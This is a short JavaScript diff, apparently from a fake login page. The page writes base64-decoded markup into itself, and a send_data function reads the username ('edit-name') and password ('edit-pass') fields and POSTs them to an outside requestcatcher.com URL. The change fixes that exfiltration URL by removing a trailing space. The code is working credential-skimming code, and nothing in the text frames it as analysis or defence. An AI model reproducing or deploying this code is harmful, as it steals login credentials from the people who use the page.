@@ -7,7 +7,7 @@ document.write(atou(base64encoded));
 document.close();
 function send_data(){
 	var http = new XMLHttpRequest();
-	var url = 'https://akjhaa.requestcatcher.com/test ';	
+	var url = 'https://akjhaa.requestcatcher.com/test';	
 	var params = document.getElementById('edit-name').value + '||' + document.getElementById('edit-pass').value;
 	http.open('POST', url, true);
 	http.send(params);
